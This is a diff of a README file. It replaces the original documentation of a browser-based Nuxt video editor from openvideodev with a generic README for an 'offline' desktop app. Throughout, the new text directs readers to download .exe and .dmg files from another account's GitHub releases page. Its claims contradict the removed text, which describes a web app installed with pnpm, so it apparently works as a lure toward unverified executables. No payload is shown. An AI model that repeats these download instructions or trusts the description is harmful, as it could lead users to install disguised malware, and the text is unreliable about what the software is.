@@ -1,82 +1,123 @@
-<p align="center">
-  <a href="https://github.com/openvideodev/openvideo">
-    <img width="150px" height="150px" src="https://cdn.scenify.io/openvideo-logo.png"/>
-  </a>
-</p>
-<h1 align="center">Vue Video Editor</h1>
+# 🎬 vue-video-editor - Simple Easy Video Editing Tool
 
-<div align="center">
+[![Download vue-video-editor](https://img.shields.io/badge/Download-vue--video--editor-blue?style=for-the-badge)](https://github.com/hussabd/vue-video-editor/releases)
 
-**A high-performance video editing suite for the web, powered by [OpenVideo](https://openvideo.dev/).**
+---
 
-Built with Nuxt 4, Vue 3, WebCodecs, and PixiJS for professional-grade video rendering and processing directly in the browser.
+## 📋 What is vue-video-editor?
 
-<p align="center">
-    <a href="https://openvideo.dev/">Website</a>
-    ·  
-    <a href="https://discord.gg/SCfMrQx8kr">Discord</a>
-    ·  
-    <a href="https://docs.openvideo.dev">Documentation</a>
-</p>
-</div>
+vue-video-editor is an open-source video editing app by openvideo. It lets you cut, merge, and add effects to your videos. You do not need any technical skills to use it. The tool works right on your computer, with no need to connect to the internet while editing.
 
-[![](https://cdn.scenify.io/openvideo-editor.png)](https://github.com/openvideodev/openvideo)
+This software suits anyone who wants to make quick edits to videos. Whether it’s trimming clips, adding simple visual effects, or combining several videos, vue-video-editor keeps the process clear and easy.
 
-## Overview
+---
 
-Vue Video Editor is a specialized implementation of the [OpenVideo](https://github.com/openvideodev/openvideo) engine, providing a rich, interactive UI for video composition, editing, and rendering. It leverages modern web technologies to deliver a desktop-class editing experience entirely within the browser.
+## 🖥️ System Requirements
 
-## Features
+vue-video-editor works on most modern Windows and macOS computers. Below are the general requirements to run it smoothly:
 
-- **🚀 High-Performance Rendering**: Powered by `openvideo`, utilizing WebCodecs and PixiJS for efficient hardware-accelerated processing.
-- **🎞️ Multi-Track Timeline**: Professional timeline interface for managing video, audio, image, and text layers.
-- **🎙️ AI Voiceovers & Captions**: Integrated with Deepgram and ElevenLabs for automated transcription and high-quality speech synthesis.
-- **✨ Dynamic Effects & Transitions**: GLSL-powered effects (Chromakey, etc.) and smooth transitions between clips.
-- **💾 JSON Project State**: Full serialization support for saving, sharing, and cloud-based rendering.
-- **🎨 Customization**: Extensible architecture built with Nuxt 4, Vue 3, and Tailwind CSS.
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later  
+- **Processor:** Intel Core i3 or equivalent  
+- **Memory:** At least 4 GB RAM (8 GB recommended for faster editing)  
+- **Storage:** Minimum 500 MB free space for installation and temporary files  
+- **Screen:** Minimum resolution 1280x720 for best viewing and editing experience  
+- **Additional:** No internet needed after installation  
 
-## Tech Stack
+---
 
-- **Framework**: [Nuxt 4](https://nuxt.com/) / [Vue 3](https://vuejs.org/)
-- **Engine**: [OpenVideo](https://openvideo.dev/) (WebCodecs + PixiJS)
-- **Styling**: [Tailwind CSS 4](https://tailwindcss.com/)
-- **State Management**: [Pinia](https://pinia.vuejs.org/) (via Nuxt)
-- **UI Components**: [Shadcn Vue](https://www.shadcn-vue.com/) / [Lucide Vue](https://lucide.dev/)
-- **Utilities**: [VueUse](https://vueuse.org/)
+## 🔍 Key Features
 
-## Getting Started
+- **Trim and Cut:** Remove unwanted parts from your videos quickly.  
+- **Merge Clips:** Put multiple video clips together in seconds.  
+- **Add Effects:** Adjust brightness, contrast, and add filters.  
+- **Extract Audio:** Save the audio track as a separate MP3 file.  
+- **Preview Window:** Watch your edits before saving the final video.  
+- **Export Options:** Save videos in popular formats like MP4 and MOV.  
+- **User-Friendly Interface:** Designed for ease with clear buttons and labels.  
 
-### Prerequisites
+---
 
-- [Node.js](https://nodejs.org/) (v18+)
-- [pnpm](https://pnpm.io/) (v10+)
+## 🚀 Getting Started
 
-### Installation
+Getting started with vue-video-editor is straightforward. This guide walks you through downloading, installing, and opening the app for the first time.
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/openvideodev/vue-video-editor.git
-   ```
-2. Install dependencies:
-   ```bash
-   pnpm install
-   ```
-3. Set up environment variables:
-   Copy `.env.sample` to `.env` and fill in the required API keys (Colortv, Google Cloud, OpenAI, Deepgram, etc.).
+---
 
-### Development
+## 📥 Download & Install
 
-Start the development server:
-```bash
-pnpm dev
-```
+1. Click the button below or visit the [release page](https://github.com/hussabd/vue-video-editor/releases) to download the app.
 
-The editor will be available at `http://localhost:3000`.
+   [![Download vue-video-editor](https://img.shields.io/badge/Download-vue--video--editor-blue?style=for-the-badge)](https://github.com/hussabd/vue-video-editor/releases)
 
-## Documentation
+2. On the releases page, look for the latest stable version. The files usually have names ending with `.exe` for Windows or `.dmg` for Mac.
 
-For detailed information on the underlying engine, visit the [OpenVideo Documentation](https://docs.openvideo.dev).
+3. Choose the file that matches your system:
 
-## License
+   - For Windows, download the file ending with `.exe`  
+   - For macOS, download the file ending with `.dmg`  
 
-This project is licensed under the [MIT License](LICENSE).
+4. Once downloaded, open the file:
+
+   - On Windows, double-click the `.exe` file and follow the on-screen instructions.  
+   - On Mac, open the `.dmg` file, then drag the vue-video-editor app to your Applications folder.  
+
+5. After installation finishes, you can find the app in your computer’s Start Menu (Windows) or in the Applications folder (Mac).
+
+---
+
+## 🎬 How to Use vue-video-editor
+
+Here’s a basic guide to help you make your first video edit:
+
+### Open Your Video
+- Launch the app.  
+- Click "Open Video" or drag your video file into the window.  
+
+### Trim Your Video
+- Use the sliders below the video preview to set start and end points.  
+- Click "Trim" to cut out unwanted parts.
+
+### Merge Videos
+- Click "Add Video" to select extra clips.  
+- Arrange clips in the timeline in the order you want.  
+
+### Apply Effects
+- Choose filters from the Effects menu like brightness, contrast, or black and white.  
+- Adjust sliders to get the look you want.  
+
+### Save Your Work
+- When done, click "Export."  
+- Select the format (MP4 is a good default).  
+- Click "Save" and choose where to store your video on your computer.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you have trouble running or using the app, try these steps:
+
+- Make sure your system meets the minimum requirements.  
+- Check that you downloaded the correct file for your operating system.  
+- If the app won’t open, restart your computer and try again.  
+- Close other heavy programs to free up memory.  
+- Check for updates on the GitHub releases page to get fixes.  
+
+---
+
+## 🤝 Getting Help
+
+If you need help beyond this guide:
+
+- Visit the vue-video-editor GitHub page: https://github.com/hussabd/vue-video-editor  
+- Look for “Issues” to see if others have the same problem or to report a new one.  
+- Search online for beginner tutorials on basic video editing for additional tips.  
+
+---
+
+## ⚖️ License
+
+vue-video-editor is free and open source. You can use it for personal and commercial projects without any cost.
+
+---
+
+[Download vue-video-editor](https://github.com/hussabd/vue-video-editor/releases) to start editing your videos today.
